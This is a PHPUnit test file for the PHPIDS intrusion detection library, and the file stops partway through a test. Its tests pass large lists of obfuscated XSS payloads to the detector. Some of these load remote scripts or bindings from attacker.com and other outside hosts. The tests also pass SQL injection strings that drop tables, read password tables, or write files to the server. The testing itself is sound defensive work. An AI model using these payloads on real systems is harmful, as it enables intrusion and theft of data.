<?php

/**
 * PHPIDS
 * Requirements: PHP5, SimpleXML
 *
 * Copyright (c) 2007 PHPIDS group (http://php-ids.org)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; version 2 of the license.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * @package	PHPIDS tests
 * @version	SVN: $Id:MonitorTest.php 517 2007-09-15 15:04:13Z mario $
 */
require_once 'PHPUnit/Framework/TestCase.php';
set_include_path(get_include_path() . PATH_SEPARATOR . dirname(__FILE__) . '/../../lib');
require_once 'IDS/Monitor.php';
require_once 'IDS/Init.php';
require_once 'IDS/Filter/Storage.php';

class IDS_MonitorTest extends PHPUnit_Framework_TestCase {

    public function setUp() {
        $path = dirname(__FILE__) . '/../../lib/IDS/Config/Config.ini';
        $this->init = IDS_Init::init($path);
        $this->init->config['General']['filter_path'] = dirname(__FILE__) . '/../../lib/IDS/default_filter.xml';
        $this->init->config['General']['tmp_path'] = dirname(__FILE__) . '/../../lib/IDS/tmp';
        $this->init->config['Caching']['path'] = dirname(__FILE__) . '/../../lib/IDS/tmp/default_filter.cache';
    }

    public function testGetHTML() {
        $test = new IDS_Monitor(
            array('user' => 'admin<script/src=http/attacker.com>'),
            $this->init,
            array('csrf')
        );
        $test->setHtml('test1');
        $this->assertEquals(array('test1'), $test->getHtml());
    }
    
    public function testGetStorage() {
        $test = new IDS_Monitor(
            array('user' => 'admin<script/src=http/attacker.com>'),
            $this->init
        );
        $this->assertTrue($test->getStorage() instanceof IDS_Filter_Storage);
    }      

    public function testRunWithTags() {
        $test = new IDS_Monitor(
            array('user' => 'admin<script/src=http/attacker.com>'),
            $this->init,
            array('csrf')
        );

        $result = $test->run();

        foreach ($result->getEvent('user')->getFilters() as $filter) {
            $this->assertTrue(in_array('csrf', $filter->getTags()));
        }
    }

    public function testRun() {
        $test = new IDS_Monitor(
            array(
                'id'    => '9<script/src=http/attacker.com>',
                'name'  => '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent('id'));
        $this->assertTrue($result->hasEvent('name'));
    }

    public function testNoResult() {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $this->assertTrue($test->run()->isEmpty());
    }

    public function testSetExceptionsString()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $exception = 'test1';
        $test->setExceptions($exception);
        $result = $test->getExceptions();
        $this->assertEquals($exception, $result[0]);
    }

    public function testSetExceptionsArray()
    {
        $test = new IDS_Monitor(array('test', 'bla'), $this->init);
        $exceptions = array('test1', 'test2');
        $test->setExceptions($exceptions);
        $this->assertEquals($exceptions, $test->getExceptions());
    }

    public function testList()
    {
        $test = new IDS_Monitor(
            array(
                '9<script/src=http/attacker.com>',
                '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(33, $result->getImpact());
    }

    public function testListWithJsonFilters()
    {

        $this->init->config['General']['filter_type'] = 'json';
        $this->init->config['General']['filter_path'] = dirname(__FILE__) . '/../../lib/IDS/default_filter.json';

        $test = new IDS_Monitor(
            array(
                '9<script/src=http/attacker.com>',
                '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="'
            ),
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(33, $result->getImpact());
        $this->init->config['General']['filter_type'] = 'xml';
        $this->init->config['General']['filter_path'] = dirname(__FILE__) . '/../../lib/IDS/default_filter.xml';
    }

    public function testListWithKeyScanning() {
        $exploits = array();
        $exploits['test1'] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
        $exploits['test2'] = '9<script/src=http/attacker.com>';
        $exploits['9<script/src=http/attacker.com>'] = '9<script/src=http/attacker.com>';
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->scanKeys = true;
        $result = $test->run();
        $this->assertEquals(41, $result->getImpact());
    }

    public function testListWithException() {
        $exploits = array();
        $exploits[] = '9<script/src=http/attacker.com>';
        $exploits[] = '" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="';
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertTrue($result->hasEvent(1));
        $this->assertEquals(33, $result->getImpact());
    }

    public function testListWithSubKeys() {
        $exploits = array('9<script/src=http/attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(41, $result->getImpact());
    }

    public function testListWithSubKeysAndExceptions() {
        $exploits = array('test1' => '9<script/src=http://attacker.com>');
        $exploits[] = array('" style="-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="');
        $exploits[] = array('9<script/src=http/attacker.com>');
        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $test->setExceptions('test1');
        $result = $test->run();
        $this->assertEquals(33, $result->getImpact());
    }

    public function testAttributeBreakerList() {

        $exploits = array();
        $exploits[] = '">XXX';
        $exploits[] = '" style ="';
        $exploits[] = '"src=xxx a="';
        $exploits[] = '"\' onerror = alert(1) ';
        $exploits[] = '" a "" b="x"';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(29, $result->getImpact());
    }

    public function testCommentList() {

        $exploits = array();
        $exploits[] = 'test/**/blafasel';
        $exploits[] = 'OR 1#';
        $exploits[] = '<!-- test -->';
        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(9, $result->getImpact());
    }

    public function testConcatenatedXSSList() {

        $exploits = array();
        $exploits[] = "s1=''+'java'+''+'scr'+'';s2=''+'ipt'+':'+'ale'+'';s3=''+'rt'+''+'(1)'+''; u1=s1+s2+s3;URL=u1";
        $exploits[] = "s1=0?'1':'i'; s2=0?'1':'fr'; s3=0?'1':'ame'; i1=s1+s2+s3; s1=0?'1':'jav'; s2=0?'1':'ascr'; s3=0?'1':'ipt'; s4=0?'1':':'; s5=0?'1':'ale'; s6=0?'1':'rt'; s7=0?'1':'(1)'; i2=s1+s2+s3+s4+s5+s6+s7;";
        $exploits[] = "s1=0?'':'i';s2=0?'':'fr';s3=0?'':'ame';i1=s1+s2+s3;s1=0?'':'jav';s2=0?'':'ascr';s3=0?'':'ipt';s4=0?'':':';s5=0?'':'ale';s6=0?'':'rt';s7=0?'':'(1)';i2=s1+s2+s3+s4+s5+s6+s7;i=createElement(i1);i.src=i2;x=parentNode;x.appendChild(i);";
        $exploits[] = "s1=['java'+''+''+'scr'+'ipt'+':'+'aler'+'t'+'(1)'];";
        $exploits[] = "s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];";
        $exploits[] = "s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';";
        $exploits[] = "s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;";
        $exploits[] = "t0 =1? \"val\":0;t1 =1? \"e\":0;t2 =1? \"nam\":0;t=1? t1+t0:0;t=1?t[1? t:0]:0;t=(1? t:0)(1? (1? t:0)(1? t2+t1:0):0);";
        $exploits[] = "a=1!=1?0:'eva';b=1!=1?0:'l';c=a+b;d=1!=1?0:'locatio';e=1!=1?0:'n.has';f=1!=1?0:'h.substrin';g=1!=1?0:'g(1)';h=d+e+f+g;0[''+(c)](0[''+(c)](h));";
        $exploits[] = 'b=(navigator);c=(b.userAgent);d=c[61]+c[49]+c[6]+c[4];e=\'\'+/abcdefghijklmnopqrstuvwxyz.(1)/;f=e[12]+e[15]+e[3]+e[1]+e[20]+e[9]+e[15]+e[14]+e[27]+e[8]+e[1]+e[19]+e[8]+e[27]+e[19]+e[21]+e[2]+e[19]+e[20]+e[18]+e[9]+e[14]+e[7]+e[28]+e[29]+e[30];0[\'\'+[d]](0[\'\'+(d)](f));';
        $exploits[] = "c4=1==1&&'(1)';c3=1==1&&'aler';c2=1==1&&':';c1=1==1&&'javascript';a=c1+c2+c3+'t'+c4;(URL=a);";
        $exploits[] = "x=''+/abcdefghijklmnopqrstuvwxyz.(1)/;e=x[5];v=x[22];a=x[1];l=x[12];o=x[15];c=x[3];t=x[20];i=x[9];n=x[14];h=x[8];s=x[19];u=x[21];b=x[2];r=x[18];g=x[7];dot=x[27];uno=x[29];op=x[28];cp=x[30];z=e+v+a+l;y=l+o+c+a+t+i+o+n+dot+h+a+s+h+dot+s+u+b+s+t+r+i+n+g+op+uno+cp;0[''+[z]](0[''+(z)](y));";
        $exploits[] = "d=''+/eval~locat~ion.h~ash.su~bstring(1)/;e=/.(x?.*)~(x?.*)~(x?.*)~(x?.*)~(x?.*)./;f=e.exec(d);g=f[2];h=f[3];i=f[4];j=f[5];k=g+h+i+j;0[''+(f[1])](0[''+(f[1])](k));";
        $exploits[] = "a=1!=1?/x/:'eva';b=1!=1?/x/:'l';a=a+b;e=1!=1?/x/:'h';b=1!=1?/x/:'locatio';c=1!=1?/x/:'n';d=1!=1?/x/:'.has';h=1!=1?/x/:'1)';g=1!=1?/x/:'ring(0';f=1!=1?/x/:'.subst';b=b+c+d+e+f+g+h;B=00[''+[a]](b);00[''+[a]](B);";
        $exploits[] = "(z=String)&&(z=z() );{a=(1!=1)?a:'eva'+z}{a+=(1!=1)?a:'l'+z}{b=(1!=1)?b:'locatio'+z}{b+=(1!=1)?b:'n.has'+z}{b+=(1!=1)?b:'h.subst'+z}{b+=(1!=1)?b:'r(1)'+z}{c=(1!=1)?c:(0)[a]}{d=c(b)}{c(d)}";
        $exploits[] = "{z=(1==4)?here:{z:(1!=5)?'':be}}{y=(9==2)?dragons:{y:'l'+z.z}}{x=(6==5)?3:{x:'a'+y.y}}{w=(5==8)?9:{w:'ev'+x.x}}{v=(7==9)?3:{v:'tr(2)'+z.z}}{u=(3==8)?4:{u:'sh.subs'+v.v}}{t=(6==2)?6:{t:y.y+'ocation.ha'+u.u}}{s=(4==3)?3:{s:(8!=3)?(2)[w.w]:z}}{r=s.s(t.t)}{s.s(r)+z.z}";
        $exploits[] = "{z= (1.==4.)?here:{z: (1.!=5.)?'':be}}{y= (9.==2.)?dragons:{y: 'l'+z.z}}{x= (6.==5.)?3:{x: 'a'+y.y}}{w= (5.==8.)?9:{w: 'ev'+x.x}}{v= (7.==9.)?3:{v: 'tr(2.)'+z.z}}{u= (3.==8.)?4:{u: 'sh.subs'+v.v}}{t= (6.==2.)?6:{t: y.y+'ocation.ha'+u.u}}{s= (4.==3.)?3:{s: (8.!=3.)?(2.)[w.w]:z}}{r= s.s(t.t)}{s.s(r)+z.z}";
        $exploits[] = "a=1==1?1==1.?'':x:x;b=1==1?'val'+a:x;b=1==1?'e'+b:x;c=1==1?'str(1)'+a:x;c=1==1?'sh.sub'+c:x;c=1==1?'ion.ha'+c:x;c=1==1?'locat'+c:x;d=1==1?1==1.?0.[b]:x:x;d(d(c))";
        $exploits[] = "{z =(1)?\"\":a}{y =(1)?{y: 'l'+z}:{y: 'l'+z.z}}x=''+z+'eva'+y.y;n=.1[x];{};;
                            o=''+z+\"aler\"+z+\"t(x)\";
                            n(o);";
        $exploits[] = ";{z =(1)?\"\":a}{y =(1)?{y: 'eva'+z}:{y: 'l'+z.z}}x=''+z+{}+{}+{};
                            {};;
                            {v =(0)?z:z}v={_$:z+'aler'+z};
                            {k =(0)?z:z}k={_$$:v._$+'t(x)'+z};
                            x=''+y.y+'l';{};

                            n=.1[x];
                            n(k._$$)";
        $exploits[] = "ä=/ä/!=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);$=.0[b];a=$;a(c)";
        $exploits[] = 'x=/x/
                            $x=!!1?\'ash\':xx
                            $x=!!1?\'ation.h\'+$x:xx
                            $x=!!1?\'loc\'+$x:xx
                            x.x=\'\'. eval,
                            x.x(x.x($x)
                            )';
        $exploits[] = 'a=/x/
                            $b=!!1e1?\'ash\':a
                            $b=!!1e1?\'ion.h\'+$b:a
                            $b=!!1e1?\'locat\'+$b:a
                            $a=!1e1?!1e1:eval
                            a.a=$a
                            $b=a.a($b)
                            $b=a.a($b)';
        $exploits[] = 'y=name,null
                            $x=eval,null
                            $x(y)';
        $exploits[] = '$=\'e\'
                        ,x=$[$+\'val\']
                        x(x(\'nam\'+$)+$)';
        $exploits[] = 'typeof~delete~typeof~alert(1)';
        $exploits[] = 'ªª=1&& name
                        ª=1&&window.eval,1
                        ª(ªª)';
        $exploits[] = "y='nam' x=this.eval x(x(y  ('e') new Array) y)";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(1106, $result->getImpact());
    }

    public function testConcatenatedXSSList2() {

        $exploits = array();
        $exploits[] = "ä=/ä/?'': 0;b=(ä+'eva'+ä);b=(b+'l'+ä);d=(ä+'XSS'+ä);c=(ä+'aler'+ä);c=(c+'t(d)'+ä);ä=.0[b];ä(c)";
        $exploits[] = "b = (x());
                        $ = .0[b];a=$;
                        a( h() );
                        function x () { return 'eva' + p(); };
                        function p() { return 'l' ; };
                        function h() { return 'aler' + i(); };
                        function i() { return 't (123456)' ; };";
        $exploits[] = "s=function test2() {return 'aalert(1)a';1,1}();
                        void(a = {} );
                        a.a1=function xyz() {return s[1] }();
                        a.a2=function xyz() {return s[2] }();
                        a.a3=function xyz() {return s[3] }();
                        a.a4=function xyz() {return s[4] }();
                        a.a5=function xyz() {return s[5] }();
                        a.a6=function xyz() {return s[6] }();
                        a.a7=function xyz() {return s[7] }();
                        a.a8=function xyz() {return s[8] }();
                        $=function xyz() {return a.a1 + a.a2 + a.a3 +a.a4 +a.a5 + a.a6 + a.a7
                        +a.a8 }();
                        new Function($)();";
        $exploits[] = "x = localName.toLowerCase() + 'lert(1),' + 0x00;new Function(x)()";
        $exploits[] = "txt = java.lang.Character (49) ;rb = java.lang.Character (41) ;lb =
                        java.lang.Character (40) ;a = java./**/lang.Character (97) ;l =
                        java.lang.Character (108) ;e = java.//
                        lang.Character (101) ;r =
                        java.lang.Character (114) ;t = java . lang.Character (116) ; v =
                        java.lang.Character (118) ;f = as( ) ; function msg () { return lb+
                        txt+ rb }; function as () { return a+ l+ e+ r+ t+ msg() }; function
                        ask () { return e+ v+ a+ l };g = ask ( ) ; (0[g])(f) ";
        $exploits[] =  "s=new String;
                            e = /aeavaala/+s;
                            e = new String + e[ 2 ] + e[ 4 ] + e[ 5 ] + e[ 7 ];
                            a = /aablaecrdt(1)a/+s;
                            a = new String + a[ 2]+a[ 4 ] + a[ 6 ] + a[ 8 ] + a[ 10 ] + a[ 11 ]
                            + a[ 12 ] + a[ 13 ],
                            e=new Date() [e];";
        $exploits[] = '$a= !false?"ev":1
                        $b= !false? "al":1
                        $a= !false?$a+$b:1
                        $a= !false?0[$a]:1
                        $b= !false?"locat":1
                        $c= !false?"ion.h":1
                        $d= !false?"ash":1
                        $b= !false?$b+$c+$d:1
                        $a setter=$a,$a=$a=$b';
        $exploits[] = "$1 = /e1v1a1l/+''
                        $2 = []
                        $2 += $1[1]
                        $2 += $1[3]
                        $2 += $1[5]
                        $2 += $1[7]
                        $2 = $1[ $2 ]
                        $3 = /a1l1e1r1t1(1)1/+''
                        $4 = []
                        $4 += $3[1]
                        $4 += $3[3]
                        $4 += $3[5]
                        $4 += $3[7]
                        $4 += $3[9]
                        $4 += $3[11]
                        $4 += $3[12]
                        $4 += $3[13]
                        $2_ = $2
                        $4_ = $4
                        $2_ ( $4_ )";
        $exploits[] = 'x=![]?\'42\':0
                        $a= !x?\'ev\':0
                        $b= !x?\'al\':0
                        $a= !x?$a+$b:0
                        $a setter = !x?0[$a]:0
                        $b= !x?\'locat\':0
                        $c= !x?\'ion.h\':0
                        $d= !x?\'ash\':0
                        $b= !x?$b+$c+$d:0
                        $msg= !x?\'i love ternary operators\':0
                        $a=$a=$b';
        $exploits[] = "123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);";
        $exploits[] = '$_ = !1-1 ? 0["\ev\al""]("\a\l\ert\(1\)"") : 0';
        $exploits[] = "$$$[0] = !1-1 ? 'eva' : 0

                        $$$[1] = !1-1 ? 'l' : 0

                        $$$['\jo\in']([])";
        $exploits[] = 'x=/eva/i[-1]
                        $y=/nam/i[-1]
                        $x$_0=(0)[x+\'l\']
                        $x=$x$_0($y+\'e\')
                        $x$_0($x)';
        $exploits[] = '$y=("eva")
                        $z={}[$y+"l"]
                        $y=("aler")
                        $y+=(/t(1)/)[-1]
                        $z($y)';
        $exploits[] = '[$y=("al")]&&[$z=$y]&&[$z+=("ert")+[]][DocDan=(/ev/)[-1]+$y]($z).valueOf()(1)';
        $exploits[] = '[$y=(\'al\')]&[$z=$y \'ert\'][a=(1?/ev/:0)[-1] $y]($z)(1)';
        $exploits[] = "0[('ev')+status+(z=('al'),z)](z+'ert(0),'+/x/)";
        $exploits[] = "0[('ev')+(n='')+(z=('al'),z)](z+'ert(0),'+/x/)";
        $exploits[] = "$={}.eval,$($('na'+navigator.vendor+('me,')+/x/))";
        $exploits[] = "ale&zwnj;rt(1)";
        $exploits[] = "ale&#x200d;rt(1)";
        $exploits[] = "ale&#8206;rt(1)";
        $exploits[] = 'al&#56325ert(1)';
        $exploits[] = 'al&#xdfff;ert(1)';
        $exploits[] = 'al�ert(1)';
        $exploits[] = '1[<t>__par{new Array}ent__</t>][<t>al{new Array}ert</t>](1) ';
        $exploits[] = '(new Option).style.setExpression(1,1&&name)';
        $exploits[] = 'default xml namespace=toolbar,b=1&&this.atob
                        default xml namespace=toolbar,e2=b(\'ZXZhbA\')
                        default xml namespace=toolbar,e=this[toolbar,e2]
                        default xml namespace=toolbar,y=1&&name
                        default xml namespace=toolbar
                        default xml namespace=e(y)';
        $exploits[] = '-Infinity++in eval(1&&name)';
        $exploits[] = 'new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array, new Array,
                        x=(\'e\')
                        x=(\'nam\')+(new Array)+x
                        y=(\'val\')
                        y=(\'e\')+(new Array)+y
                        z=this
                        z=z[y]
                        z(z(x)+x)';
        $exploits[] = 'undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        x=(\'aler\
                        t\')
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        this [x]
                        (1)
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined
                        undefined,undefined';
        $exploits[] = 'location.assign(1?name+1:(x))';
        $exploits[] = "this[('eva')+new Array + 'l'](/x.x.x/+name+/x.x/)"; 
        $exploits[] = "this[[],('eva')+(/x/,new Array)+'l'](/xxx.xxx.xxx.xxx.xx/+name,new Array)";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
	$this->assertImpact($result, 871, 865);
    }

    public function testXMLPredicateXSSList() {

        $exploits = array();
        $exploits[] = "a=<r>loca<v>e</v>tion.has<v>va</v>h.subs<v>l</v>tr(1)</r>
                        {b=0e0[a.v.text()
                        ]}http='';b(b(http+a.text()
                        ))
                        ";
        $exploits[] = 'y=<a>alert</a>;content[y](123)';
        $exploits[] = "s1=<s>evalalerta(1)a</s>; s2=<s></s>+''; s3=s1+s2; e1=/s1/?s3[0]:s1; e2=/s1/?s3[1]:s1; e3=/s1/?s3[2]:s1; e4=/s1/?s3[3]:s1; e=/s1/?.0[e1+e2+e3+e4]:s1; a1=/s1/?s3[4]:s1; a2=/s1/?s3[5]:s1; a3=/s1/?s3[6]:s1; a4=/s1/?s3[7]:s1; a5=/s1/?s3[8]:s1; a6=/s1/?s3[10]:s1; a7=/s1/?s3[11]:s1; a8=/s1/?s3[12]:s1; a=a1+a2+a3+a4+a5+a6+a7+a8;e(a)";
        $exploits[] = "location=<text>javascr{new Array}ipt:aler{new Array}t(1)</text>";
        $exploits[] = "µ=<µ ł='le' µ='a' ø='rt'></µ>,top[µ.@µ+µ.@ł+µ.@ø](1)";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(154, $result->getImpact());
    }
    
    public function testConditionalCompilationXSSList() {

        $exploits = array();
        $exploits[] = "/*@cc_on@set@x=88@set@ss=83@set@s=83@*/@cc_on alert(String.fromCharCode(@x,@s,@ss))";
        $exploits[] = "@cc_on eval(@cc_on name)";
        $exploits[] = "@if(@_mc680x0)@else alert(@_jscript_version)@end";
        $exploits[] = "\"\"@cc_on,x=@cc_on'something'@cc_on";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(87, $result->getImpact());
    }    

    public function testXSSList() {

        $exploits = array();
        $exploits[] = '\'\'"--><script>eval(String.fromCharCode(88,83,83)));%00';
        $exploits[] = '"></a style="xss:ex/**/pression(alert(1));"';
        $exploits[] = 'top.__proto__._= alert
                       _(1)';
        $exploits[] = 'document.__parent__._=alert
                      _(1)';
        $exploits[] = 'alert(1)';
        $exploits[] = "b=/a/,
                        d=alert
                        d(";
        $exploits[] = "1
                        alert(1)";
        $exploits[] = "crypto [ [ 'aler' , 't' ] [ 'join' ] ( [] ) ] (1) ";
        $exploits[] = "<div/style=\-\mo\z\-b\i\nd\in\g:\url(//business\i\nfo.co.uk\/labs\/xbl\/xbl\.xml\#xss)>";
        $exploits[] = "_content/alert(1)";
        $exploits[] = "RegExp(/a/,alert(1))";
        $exploits[] = "x=[/&/,alert,/&/][1],x(1)";
        $exploits[] = "[1,alert,1][1](1)";
        $exploits[] = "throw alert(1)";
        $exploits[] = "delete alert(1)";
        $exploits[] = "$=.7.eval,$(//
                        name
                        ,1)";
        $exploits[] = "$=.7.eval,$($('\rname'),1)";
        $exploits[] = "e=1..eval
                        e(e(\"\u200fname\"),e)";
        $exploits[] = "<x///style=-moz-\&#x362inding:url(//businessinfo.co.uk/labs/xbl/xbl.xml#xss)>";
        $exploits[] = "a//a'\u000aeval(name)";
        $exploits[] = "a//a';eval(name)";
        $exploits[] = "(x) setter=0?0.:alert,x=0";
        $exploits[] = "y=('na') + new Array +'me'
                        y
                        (x)getter=0?0+0:eval,x=y
                        'foo bar foo bar f'";
        $exploits[] = "'foo bar foo bar foo bar foo bar foo bar foo bar foo bar foo'
                        y$=('na') +new Array+'me'
                        x$=('ev') +new Array+'al'
                        x$=0[x$]
                        x$(x$(y$)+y$)";
        $exploits[] = "<applet/src=http://businessinfo.co.uk/labs/xss.html
                        type=text/html>";
        $exploits[] = "onabort=onblur=onchange=onclick=ondblclick=onerror=onfocus=onkeydown=onkeypress=onkeyup=onload=onmousedown=onmousemove=onmouseout=onmouseover=onmouseup=onreset=onresize=onselect=onsubmit=onunload=alert";
        $exploits[] = 'onload=1&&alert';
        $exploits[] = "document.createStyleSheet('http://businessinfo.co.uk/labs/xss/xss.css')";
        $exploits[] = "document.body.style.cssText=name";
        $exploits[] = "for(i=0;;)i";
        $exploits[] = "stop.sdfgkldfsgsdfgsdfgdsfg in alert(1)";
        $exploits[] = "this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        this .fdgsdfgsdfgdsfgdsfg
                        aaaaaaaaaaaaaaaa :-(alert||foo)(1)||foo";
        $exploits[] = "(this)[new Array+('eva')+new Array+ 'l'](/foo.bar/+name+/foo.bar/)";
        $exploits[] = '<video/title=.10000/aler&#x74;(1) onload=.1/setTimeout(title)>';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 563, 587);
    }

    public function testSelfContainedXSSList() {

        $exploits = array();
        $exploits[] = 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));';
        $exploits[] = 'eval.call(this,unescape.call(this,location))';
        $exploits[] = 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))';
        $exploits[] = '_=eval,__=unescape,___=document.URL,_(__(___))';
        $exploits[] = '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))';
        $exploits[] = '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)';
        $exploits[] = 'ev\al.call(this,unescape.call(this,location))';
        $exploits[] = 'setTimeout//
                        (name//
                        ,0)//';
        $exploits[] = 'a=/ev/
                        .source
                        a+=/al/
                        .source,a = a[a]
                        a(name)';
        $exploits[] = 'a=eval,b=(name);a(b)';
        $exploits[] = 'a=eval,b= [ referrer ] ;a(b)';
        $exploits[] = "URL = ! isNaN(1) ? 'javascriptz:zalertz(1)z' [/replace/ [ 'source' ] ]
                        (/z/g, [] ) : 0";
        $exploits[] = "if(0){} else eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array)
                        'foo bar foo bar foo'";
        $exploits[] = "switch('foo bar foo bar foo bar') {case eval(new Array + ('eva') + new Array + ('l(n') + new Array + ('ame) + new Array') + new Array):}";
        $exploits[] = "xxx='javascr',xxx+=('ipt:eva'),xxx+=('l(n'),xxx+=('ame),y')
                        Cen:tri:fug:eBy:pas:sTe:xt:do location=(xxx)
                        while(0)
                        ";

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertImpact($result, 479, 492);
    }

    public function testSQLIList() {

        $exploits = array();
        $exploits[] = '" OR 1=1#';
        $exploits[] = '; DROP table Users --';
        $exploits[] = '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1';
        $exploits[] = 'admin\'--';
        $exploits[] = 'SELECT /*!32302 1/0, */ 1 FROM tablename';
        $exploits[] = '10;DROP members --';
        $exploits[] = ' SELECT IF(1=1,\'true\',\'false\')';
        $exploits[] = 'SELECT CHAR(0x66)';
        $exploits[] = 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)';
        $exploits[] = 'EXEC(@stored_proc @param)';
        $exploits[] = 'chr(11)||chr(12)||char(13)';
        $exploits[] = 'MERGE INTO bonuses B USING (SELECT';
        $exploits[] = '1 or name like \'%\'';
        $exploits[] = '1 OR \'1\'!=0';
        $exploits[] = '1 OR ASCII(2) = ASCII(2)';
        $exploits[] = '1\' OR 1&"1';
        $exploits[] = '1\' OR \'1\' XOR \'0';
        $exploits[] = '1 OR+1=1';
        $exploits[] = '1 OR+(1)=(1)';
        $exploits[] = '1 OR \'1';
        $exploits[] = 'aaa\' or (1)=(1) #!asd';
        $exploits[] = 'aaa\' OR (1) IS NOT NULL #!asd';
        $exploits[] = 'a\' or 1=\'1';
        $exploits[] = 'asd\' union (select username,password from admins) where id=\'1';
        $exploits[] = "1'; WAITFOR TIME '17:48:00 ' shutdown -- -a";
        $exploits[] = "1'; anything: goto anything -- -a";
        $exploits[] = "' =+ '";
        $exploits[] = "asd' =- (-'asd') -- -a";
        $exploits[] = 'aa"in+ ("aa") or -1 != "0';
        $exploits[] = 'aa" =+ - "0  ';
        $exploits[] = "aa' LIKE 0 -- -a";
        $exploits[] = "aa' LIKE md5(1) or '1";
        $exploits[] = "aa' REGEXP- md5(1) or '1";
        $exploits[] = "aa' DIV@1 = 0 or '1";
        $exploits[] = "aa' XOR- column != -'0";
        $exploits[] = '============================="';

        $this->_testForPlainEvent($exploits);

        $test = new IDS_Monitor(
            $exploits,
            $this->init
        );
        $result = $test->run();
        $this->assertEquals(465, $result->getImpact());
    }

    public function testSQLIList2() {

        $exploits = array();
        $exploits[] = 'asd"or-1="-1';
        $exploits[] = 'asd"or!1="!1';
        $exploits[] = 'asd"or!(1)="1';
        $exploits[] = 'asd"or@1="@1';
        $exploits[] = 'asd"or-1 XOR"0';
        $exploits[] = 'asd" or ascii(1)="49';
        $exploits[] = 'asd" or md5(1)^"1';
        $exploits[] = 'asd" or table.column^"1';
        $exploits[] = 'asd" or @@version^"0';
        $exploits[] = 'asd" or @@global.hot_cache.key_buffer_size^"1';
        $exploits[] = 'asd" or!(selec79t name from users limit 1)="1';
        $exploits[] = '1"OR!"a';
        $exploits[] = '1"OR!"0';
        $exploits[] = '1"OR-"1';
        $exploits[] = '1"OR@"1" IS NULL #1 ! (with unfiltered comment by tx ;)';
        $exploits[] = '1"OR!(false) #1 !';
        $exploits[] = '1"OR-(true) #a !';
        $exploits[] = '1" INTO OUTFILE "C:/webserver/www/readme.php';
        $exploits[] = "asd' or md5(5)^'1 ";
        $exploits[] = "asd' or column^'-1 ";
        $exploits[] = "asd' or true -- a";
        $exploits[] = '\"asd" or 1="1';
        $exploits[] = "a 1' or if(-1=-1,true,false)#!";
        $exploits[] = "aa\\\\\"aaa' or '1";
        $exploits[] = "' or id= 1 having 1 #1 !";
        $exploits[] = "' or id= 2-1 having 1 #1 !";
        $exploits[] = "aa'or null is null #(";
        $exploits[] = "aa'or current_user!=' 1";
        $exploits[] = "aa'or BINARY 1= '1";
